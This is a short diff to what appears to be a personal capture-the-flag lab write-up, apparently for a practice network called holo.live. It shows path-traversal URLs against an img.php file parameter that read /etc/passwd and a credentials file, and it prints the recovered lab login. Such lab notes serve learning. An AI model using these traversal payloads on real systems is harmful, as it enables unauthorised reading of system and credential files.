@@ -78,3 +78,21 @@ http://dev.holo.live/img.php?file=../../../../etc/passwd
 ```
 ![[Pasted image 20240813200211.png]]
 
+So we found a new site in admin 
+```
+http://admin.holo.live/robots.txt
+```
+![[Pasted image 20240813202422.png]]
+
+So now we can give it a try if we can read the creds.txt 
+
+```
+http://dev.holo.live/img.php?file=../../../../../../../../var/www/admin/supersecretdir/creds.txt
+```
+
+Yup it worked and i got the password
+```
+I know you forget things, so I'm leaving this note for you:
+admin:DBManagerLogin!
+- gurag <3
+```
